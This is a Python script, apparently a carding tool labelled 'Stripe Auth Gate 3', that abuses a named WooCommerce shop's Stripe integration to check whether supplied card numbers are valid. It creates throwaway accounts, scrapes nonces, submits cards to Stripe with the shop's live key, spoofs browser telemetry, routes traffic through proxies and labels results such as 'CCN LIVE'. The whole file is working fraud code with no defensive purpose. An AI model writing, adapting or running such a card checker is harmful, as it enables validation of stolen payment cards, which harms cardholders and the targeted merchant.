"""
Stripe Auth Gate 3 — WooCommerce + Stripe (createAndConfirmSetupIntent)
Site: shop.nemaneide.com
PK: pk_live_51ROOSi03FG8Au2CBvmO4o6DP0qA0RZrRrfZOnaBDsGPJGmufqblXi5kMzp8RwDVwaKd8ggjdazNJV7X72tBgnoFs00BuEsszoz

Based on the standalone Stripe 0$ auth script.

Flow:
  1. GET /my-account/ → extract register nonce
  2. POST register → get WP cookies
  3. GET /my-account/payment-methods/ → extract setupIntent nonce
  4. POST Stripe API → create payment method (pm_xxx)
  5. POST wc-ajax → confirm setup intent → get result
"""

import re
import string
import random
import json
import aiohttp


SITE = "https://shop.nemaneide.com"
STRIPE_PK = "pk_live_51ROOSi03FG8Au2CBvmO4o6DP0qA0RZrRrfZOnaBDsGPJGmufqblXi5kMzp8RwDVwaKd8ggjdazNJV7X72tBgnoFs00BuEsszoz"

UA = "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36"


def _rand_hex(k=32):
    return ''.join(random.choices(string.hexdigits.lower(), k=k))


def _rand_str(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def _extract_field(html, name):
    """Extract a form field value by name."""
    m = re.search(rf'name="{name}"\s+value="([^"]+)"', html, re.I)
    return m.group(1) if m else None


def _extract_json_field(html, key):
    """Extract a JSON string value by key."""
    m = re.search(rf'"{key}"\s*:\s*"([^"]+)"', html)
    return m.group(1) if m else None


def _extract_error(text: str) -> str:
    """Extract error message from Stripe/WC response."""
    m = re.search(r'"decline_code"\s*:\s*"([^"]+)"', text)
    if m:
        return m.group(1).upper()
    m = re.search(r'"message"\s*:\s*"([^"]+)"', text)
    if m:
        return m.group(1)
    m = re.search(r'"code"\s*:\s*"([^"]+)"', text)
    if m:
        return m.group(1).upper()
    return ''


async def stripe_auth3_check(card_str: str, proxy_str=None):
    """
    Stripe Auth Gate 3 — shop.nemaneide.com (WooCommerce + Stripe SetupIntent)

    Args:
        card_str: Card in cc|mm|yy|cvv format
        proxy_str: Optional proxy URL

    Returns:
        dict with Response, Gateway, Price keys
    """
    try:
        parts = card_str.strip().split('|')
        if len(parts) != 4:
            return {"Response": "Invalid card format", "Gateway": "Stripe-Auth3", "Price": "$0"}
        cc, mm, yy, cvv = parts
        cc = cc.strip().replace(' ', '')
        mm = mm.strip().zfill(2)
        yy = yy.strip()
        cvv = cvv.strip()
        if len(yy) == 2:
            yy = '20' + yy

        email = f"{''.join(random.choices(string.ascii_lowercase, k=6))}{_rand_hex(3)}@gmail.com"

        headers_site = {
            "User-Agent": UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
        }

        timeout = aiohttp.ClientTimeout(total=45)
        jar = aiohttp.CookieJar(unsafe=True)
        proxy_url = proxy_str if proxy_str else None

        async with aiohttp.ClientSession(timeout=timeout, cookie_jar=jar) as session:

            # ─── Step 1: GET /my-account/ → extract register nonce ───
            try:
                async with session.get(
                    f"{SITE}/my-account/",
                    headers=headers_site,
                    ssl=False,
                    allow_redirects=True,
                    proxy=proxy_url
                ) as resp:
                    page_text = await resp.text()
            except Exception as e:
                return {"Response": f"Site access failed: {str(e)[:60]}", "Gateway": "Stripe-Auth3", "Price": "$0"}

            reg_nonce = _extract_field(page_text, 'woocommerce-register-nonce')
            if not reg_nonce:
                return {"Response": "Register nonce not found", "Gateway": "Stripe-Auth3", "Price": "$0"}

            # ─── Step 2: Register account ───
            reg_data = {
                'email': email,
                'password': _rand_hex(12),
                'woocommerce-register-nonce': reg_nonce,
                '_wp_http_referer': '/my-account/',
                'register': 'Registracija',
            }

            reg_headers = {
                "User-Agent": UA,
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": SITE,
                "Referer": f"{SITE}/my-account/",
            }

            try:
                async with session.post(
                    f"{SITE}/my-account/",
                    data=reg_data,
                    headers=reg_headers,
                    ssl=False,
                    allow_redirects=True,
                    proxy=proxy_url
                ) as resp:
                    await resp.text()
            except Exception as e:
                return {"Response": f"Registration failed: {str(e)[:60]}", "Gateway": "Stripe-Auth3", "Price": "$0"}

            # ─── Step 3: GET /my-account/payment-methods/ → extract setupIntent nonce ───
            try:
                async with session.get(
                    f"{SITE}/my-account/payment-methods/",
                    headers={**headers_site, "Referer": f"{SITE}/my-account/"},
                    ssl=False,
                    allow_redirects=True,
                    proxy=proxy_url
                ) as resp:
                    pm_text = await resp.text()
            except Exception as e:
                return {"Response": f"Payment methods page failed: {str(e)[:60]}", "Gateway": "Stripe-Auth3", "Price": "$0"}

            ajax_nonce = _extract_json_field(pm_text, 'createAndConfirmSetupIntentNonce')
            if not ajax_nonce:
                return {"Response": "Setup intent nonce not found", "Gateway": "Stripe-Auth3", "Price": "$0"}

            # ─── Step 4: Create PaymentMethod via Stripe API ───
            stripe_headers = {
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
                "User-Agent": UA,
            }

            stripe_data = {
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_year]': yy,
                'card[exp_month]': mm,
                'billing_details[address][country]': 'MO',
                'key': STRIPE_PK,
                '_stripe_version': '2024-06-20',
                'payment_user_agent': 'stripe.js/fe3c872f40; stripe-js-v3/fe3c872f40; payment-element; deferred-intent',
                'guid': _rand_hex(48),
                'muid': _rand_hex(32),
                'sid': _rand_hex(32),
                'time_on_page': str(random.randint(5000, 15000)),
            }

            async with session.post(
                "https://api.stripe.com/v1/payment_methods",
                data=stripe_data,
                headers=stripe_headers,
                ssl=False,
                proxy=proxy_url
            ) as resp:
                stripe_text = await resp.text()

            try:
                stripe_json = json.loads(stripe_text)
            except Exception:
                stripe_json = {}

            if 'error' in stripe_json:
                err = stripe_json['error']
                decline_code = err.get('decline_code', '')
                err_msg = err.get('message', '')
                err_code = err.get('code', '')
                display = decline_code or err_code or err_msg or 'TOKENIZATION_FAILED'
                return {"Response": display, "Gateway": "Stripe-Auth3", "Price": "$0"}

            pm_id = stripe_json.get('id', '')
            if not pm_id or not pm_id.startswith('pm_'):
                return {"Response": "No payment method ID returned", "Gateway": "Stripe-Auth3", "Price": "$0"}

            # ─── Step 5: Confirm setup intent via WC AJAX ───
            confirm_headers = {
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": UA,
                "Origin": SITE,
                "Referer": f"{SITE}/my-account/add-payment-method/",
            }

            confirm_data = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': ajax_nonce,
            }

            result_text = ''
            async with session.post(
                f"{SITE}/",
                params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
                headers=confirm_headers,
                data=confirm_data,
                ssl=False,
                proxy=proxy_url
            ) as resp:
                result_text = await resp.text()

            if not result_text:
                return {"Response": "No response from setup intent", "Gateway": "Stripe-Auth3", "Price": "$0"}

            # ─── Classify final response ───
            return _classify_stripe_response(result_text)

    except aiohttp.ClientError as e:
        return {"Response": f"Connection error: {str(e)[:60]}", "Gateway": "Stripe-Auth3", "Price": "$0"}
    except Exception as e:
        return {"Response": f"Exception: {str(e)[:80]}", "Gateway": "Stripe-Auth3", "Price": "$0"}


def _classify_stripe_response(result_text: str) -> dict:
    """Classify the WooCommerce Stripe setup intent response."""
    rl = result_text.lower()
    err_msg = _extract_error(result_text)

    # ── SUCCESS: Card authenticated / added ──
    if any(k in rl for k in [
        '"success":true', '"status":"succeeded"',
        'payment method added', 'payment_method_added',
    ]):
        if 'decline' in rl or 'card_declined' in rl:
            return {"Response": err_msg or "CARD_DECLINED", "Gateway": "Stripe-Auth3", "Price": "$0"}
        return {"Response": "Payment Method Added Successfully", "Gateway": "Stripe-Auth3", "Price": "$0"}

    # ── 3DS / AUTH REQUIRED ──
    if any(k in rl for k in [
        'requires_action', 'authentication_required', '3d_secure',
        '"status":"requires_confirmation"', 'redirect_to_url',
    ]):
        return {"Response": "3DS Authentication Required", "Gateway": "Stripe-Auth3", "Price": "$0"}

    # ── LIVE CARD SIGNALS (bank responded) ──
    if any(k in rl for k in [
        'incorrect_cvc', 'incorrect_zip', 'insufficient_funds',
        'invalid_cvc', 'cvc_check_failed',
    ]):
        return {"Response": err_msg or "CCN LIVE", "Gateway": "Stripe-Auth3", "Price": "$0"}

    # ── HARD DECLINES ──
    if any(k in rl for k in [
        'card_declined', 'generic_decline', 'do_not_honor',
        'fraudulent', 'lost_card', 'stolen_card',
        'pickup_card', 'restricted_card',
        'transaction_not_allowed', 'security_violation',
    ]):
        return {"Response": err_msg or "CARD_DECLINED", "Gateway": "Stripe-Auth3", "Price": "$0"}

    # ── EXPIRED ──
    if 'expired_card' in rl or 'expired' in rl:
        return {"Response": "EXPIRED_CARD", "Gateway": "Stripe-Auth3", "Price": "$0"}

    # ── VELOCITY ──
    if any(k in rl for k in ['velocity', 'too_many', 'rate_limit']):
        return {"Response": err_msg or "VELOCITY_EXCEEDED", "Gateway": "Stripe-Auth3", "Price": "$0"}

    # ── ERROR RESPONSE ──
    if '"success":false' in rl or '"error"' in rl:
        return {"Response": err_msg or "Unknown Error", "Gateway": "Stripe-Auth3", "Price": "$0"}

    # ── FALLBACK ──
    if err_msg:
        return {"Response": err_msg, "Gateway": "Stripe-Auth3", "Price": "$0"}

    return {"Response": result_text[:120], "Gateway": "Stripe-Auth3", "Price": "$0"}
